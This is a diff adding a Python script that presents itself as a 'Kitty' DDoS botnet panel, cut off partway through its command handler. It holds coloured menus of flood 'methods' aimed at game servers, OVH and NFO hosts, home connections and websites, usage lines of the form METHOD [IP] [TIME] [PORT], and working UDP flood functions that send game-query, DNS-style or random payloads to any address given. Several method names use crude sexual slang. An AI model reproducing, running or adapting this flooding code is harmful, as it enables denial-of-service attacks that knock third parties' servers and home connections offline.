@@ -1,0 +1,1263 @@
+#[+]################################[+]#
+# Offical Botnet From Kitty Services   #
+# VIP Brought To You By @✞5ℙℍℕ1𝕏✞#9944#
+#[+]################################[+]#
+
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+import sys
+import socket
+import time
+import random
+import threading
+import getpass
+import os
+import urllib
+import json
+import time
+
+nicknm = "VIP"
+
+methods = ("""
+\033[35m╔════════════════════════╗
+\033[35m║ \033[36m---- \033[32mMethods List! \033[36m--- \033[35m╚═════════╗
+\033[35m║ \033[32mGame   \033[36m> \033[32mShows Game Methods!     \033[35m║
+\033[35m║ \033[32mNFOs   \033[36m> \033[32mShows NFO  Methods!     \033[35m║
+\033[35m║ \033[32mOVHs   \033[36m> \033[32mShows OVH  Methods!     \033[35m║
+\033[35m║ \033[32mHomes  \033[36m> \033[32mShows Home Methods!     \033[35m║
+\033[35m║ \033[32mLayer7 \033[36m> \033[32mShows L7   Methods!     \033[35m║
+\033[35m║ \033[32mVIP    \033[36m> \033[32mShows VIP  Methods!     \033[35m║
+\033[35m║ \033[32mLayer4 \033[36m> \033[32mShows L4   Methods!     \033[35m║
+\033[35m╚══════════════════════════════════╝
+""")
+
+games = ("""
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                               😂We Run Your Game Server😂
+
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║\033[31m GAME-ALL\033[37m-\033[31mR6-DROP \033[35m        ║\033[31m COD-DROP \033[36m- \033[31m Fortnite-Drop \033[35m ║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║\033[31m Minecraft\033[36m-\033[31mAmongUs      \033[35m║ ║ \033[31mRoblox \033[36m- \033[31mPixelGunSlam    \033[35m║ 
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║     \033[31mExample How To Attack\033[36m:\033[31m  METHOD [IP] [TIME] [PORT] \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+nfos = ("""
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                               😂We Run Your NFO Server😂
+
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║ \33[31mNFO-Drop \033[31m- \033[31mNFO-Rape \033[35m     ║\033[31mNFO-Slav \033[31m- \033[31mNFO-Kill         \033[31m║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║\033[31mNFO-Null\033[31m- \033[31mNFO-Slam      \033[35m║ ║\033[31m NFO-Clap \033[31m- \033[31mNFO-Slump     \033[31m║
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║     \033[31mExample How To Attack\033[93m:\033[31m  METHOD [IP] [TIME] [PORT] \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+ovhs = (""" 
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                               😂We Run Your OVH Server😂
+
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║ \33[31mOVH-Drop  \033[31m- \033[31mOVH-Rape \033[35m    ║\033[31m  OVH-Slav \033[36m- \033[31mOVH-Kill       \033[35m║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║\033[31mOVH-Null\033[36m- \033[31mOVH-Slam      \033[35m║ ║\033[31m  OVH-Clap \033[36m- \033[31mOVH-Slump    \033[35m║ 
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║     \033[31mExample How To Attack\033[93m:\033[31m.METHOD [IP] [TIME] [PORT]  \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+homes = ("""
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                              😂We Run Your Home Connection😂
+
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║  \033[31mHome-Null\033[31m- \033[31mSSDP   \033[35m      ║  \033[31mHome-Kill                 \033[35m║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║\033[31mCS-Home \033[31m- \033[31mHome-Slam     \033[35m║ ║\033[31mHome-Clap \033[31m- \033[31mHome-Slump    \033[35m║
+\033[35m             ║\033[36m- - - - - - - \033[31mhomerape \033[31m[IP] [TIME] [PORT] \033[36m- - - - - -\033[35m║               
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║     \033[31mExample How To Attack\033[93m:\033[31mMETHOD [IP] [TIME] [PORT]  \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+sites = ("""
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                             😂We Run Your Sites Connection😂
+
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║\033[31mCF-Kill  \033[31m- \033[31mHTTPS-Bypass  \033[31m ║\033[31m  HTTP-VIP \033[36m- \033[31mHTTPS-Storm    \033[31m║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║\033[31mHTTPS-Post\033[31m-\033[31mHTTPS-Get    \033[31m║ ║\033[31mHTTPS-StormV2 \033[36m- \033[31mHTTP-STORM\033[31m║
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║     \033[31mExample How To Attack\033[93m:\033[31mMETHOD [IP] [TIME] [PORT]  \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+vip = ("""
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                              😂We Run Your Connection😂
+
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║\033[31mVIP-OVH  \033[36m- \033[31mVIP-NFO      \033[31m  ║\033[31mOVH-TCP \033[36m- \033[31m100UP-Slap        \033[31m║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║\033[31mVIP-100UP\033[36m-\033[31mVIP-DSTAT     \033[31m║ ║\033[31m CPU(VIP) \033[36m- \033[31mTCP-VIP       \033[31m║
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║     \033[31mExample How To Attack\033[93m:\033[31mMETHOD [IP] [TIME] [PORT]  \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+layer4 = ("""                               
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                              😂We Run Your Connection😂
+\033[35m            ╔══════════════════════════╦════════════════════════════╗
+\033[35m            ║  \033[32mudp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mvse \033[36m[IP] [TIME] [PORT]   \033[35m║
+\033[35m            ║  \033[32mtcp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mack \033[36m[IP] [TIME] [PORT]   \033[35m║
+\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
+\033[35m             ║ \033[32mstd \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32mdns \033[36m[IP] [TIME] [PORT]   \033[35m║
+\033[35m             ║ \033[32msyn \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32movh \033[36m[IP] [TIME] [PORT]   \033[35m║
+\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
+\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
+\033[35m            ╚═══════════════════════════════════════════════════════╝
+""")
+
+kitty = ("""
+\033[31m      ╔══════════════════════╗
+\033[31m      ║    HELP COMMANDS     ║
+\033[31m      ╠══════════════════════╣
+\033[31m      ║ methods              ║
+\033[31m      ║ myplan               ║
+\033[31m      ╚══════════════════════╝
+""")
+
+plan = ("""
+\033[31m      ╔══════════════════════╗
+\033[31m      ║  My Plan             ║
+\033[31m      ╠══════════════════════╣
+\033[31m      ║  Plan Active:VIP     ║
+\033[31m      ║  Time: Lifetime      ║
+\033[31m      ╚══════════════════════╝
+""")
+
+banner = ("""
+\033[31m                                  ╦╔═┬┌┬┐\33[36m┌┬┐┬ ┬
+\033[31m                                  ╠╩╗│ │\33[36m  │ └┬┘
+\033[31m                                  ╩ ╩┴ ┴\33[36m  ┴  ┴ 
+\033[31m                                 😂We Run Shit Here😂
+
+\033[31m                ╔═══════════════════════════════════════════════╗
+\033[31m                ║\033[35m- - - - - - - Kitty By \033[31m@0.p.p.5   \033[35m- - - - - - -\033[31m║
+\033[31m                ║\033[35m  - - - Type \033[31mhelp\033[35m to see the Help Menu - - - - \033[31m║
+\033[31m                ║\033[35m  - - - - \033[31m Max Time For DDoS Is 1200 - - -\033[35m- - -\033[31m║
+\033[31m                ╚═══════════════════════════════════════════════╝
+""")
+
+def spoofer(): #IP Spoofer
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+
+cookie = open(".kitty_cookie","w+")
+
+fsubs = 0
+tpings = 0
+pscans = 0
+liips = 0
+tattacks = 0
+uaid = 0
+said = 0
+running = 0
+iaid = 0
+haid = 0
+aid = 0
+attack = True
+ldap = True
+http = True
+atks = 0
+def randsender(host, timer, port, punch):
+	global iaid
+	global aid
+	global tattacks
+	global running
+
+	timeout = time.time() + float(timer)
+	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+
+	iaid += 1
+	aid += 1
+	tattacks += 1
+	running += 1
+	while time.time() < timeout and ldap and attack:
+		sock.sendto(punch, (host, int(port)))
+	running -= 1
+	iaid -= 1
+	aid -= 1
+
+
+def stdsender(host, port, timer, payload):
+	global atks
+	global running
+
+	timeout = time.time() + float(timer)
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	
+	atks += 1
+	running += 1
+	while time.time() < timeout and attack:
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+		sock.sendto(payload, (host, int(port)))
+	atks -= 1
+	running -= 1
+
+def main():
+	global fsubs
+	global tpings
+	global pscans
+	global liips
+	global tattacks
+	global uaid
+	global running
+	global atk
+	global ldap
+	global said
+	global iaid
+	global haid
+	global aid
+	global attack
+	global dp
+
+	while True:
+		bots = (random.randint(32500,41500))
+		sys.stdout.write("\x1b]2;Kitty. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
+		sin = input("\033[32m[\033[35m{}\033[32m@Kitty]\033[36m$ \033[96m".format(nicknm)).lower()
+		sinput = sin.split(" ")[0]
+		if sinput == "clear":
+			os.system ("cls")
+			print (banner)
+			main()
+		if sinput == "cls":
+			os.system ("clear")
+			print (banner)
+			main()
+		elif sinput == "help":
+			os.system ("clear")
+			print (kitty)
+			main()
+		elif sinput == "layer4":
+			os.system ("clear")
+			print (layer4)
+			main()
+		elif sinput == "method":
+			os.system ("clear")
+			print (methods)
+			main()
+		elif sinput == "methods":
+			os.system ("clear")
+			print (methods)
+			main()
+		elif sinput == "game":
+			os.system ("clear")
+			print (games)
+			main()
+		elif sinput == "nfos":
+			os.system ("clear")
+			print (nfos)
+			main()
+		elif sinput == "ovhs":
+			os.system ("clear")
+			print (ovhs)
+			main()
+		elif sinput == "homes":
+			os.system ("clear")
+			print (homes)
+			main()
+		elif sinput == "exit":
+			os.system ("clear")
+			exit()
+		elif sinput == "myplan":
+			os.system ("clear")
+			print (plan)
+			main()
+		elif sinput == "vip":
+			os.system ("clear")
+			print (vip)
+			main()
+		elif sinput == "layer7":
+			os.system ("clear")
+			print (sites)
+			main()
+		elif sinput == "l7":
+			os.system ("clear")
+			print (sites)
+			main()
+		elif sinput == "std":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
+					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "dns":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+						sinput, host, timer, port = sin.split(" ")
+						socket.gethostbyname(host)
+						payload = b"\x00\x02\x00\x2f"
+						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
+						print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "vse":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+						sinput, host, timer, port = sin.split(" ")
+						socket.gethostbyname(host)
+						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
+						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
+						print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "syn":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+						sinput, host, timer, port = sin.split(" ")
+						socket.gethostbyname(host)
+						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
+						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
+						print("\033[97mYour Attack Has Been Launched!")
+			except ValueError: 
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "tcp":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "homeslap":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 2048
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "udp":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "vip-ovh":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "vip-nfo":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-tcp":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "100up-slap":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "vip-100up":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "vip-dstat":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "cpu":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "tcp-vip":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "cf-kill":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "HTTPS-Bypass":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "HTTP-VIP":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "https-storm":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "https-post":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "https-get":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "https-stormv2":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "http-storm":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "home-null":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ssdp":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "home-kill":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "cs-home":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "home-slam":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "home-clap":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "home-slump":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "homerape":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 1460
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-drop":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-rape":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4009665
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-slav":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
+					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
+					print("\033[97mYour Attack Has Been Launched!")
+			except ValueError:
+				main()
+			except socket.gaierror:
+				main()
+		elif sinput == "ovh-kill":
+			try:
+				if running >= 4:
+					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
+					main()
+				else:
+					sinput, host, timer, port = sin.split(" ")
+					socket.gethostbyname(host)
+					pack = 4096
+					punch = random._urandom(int(pack))
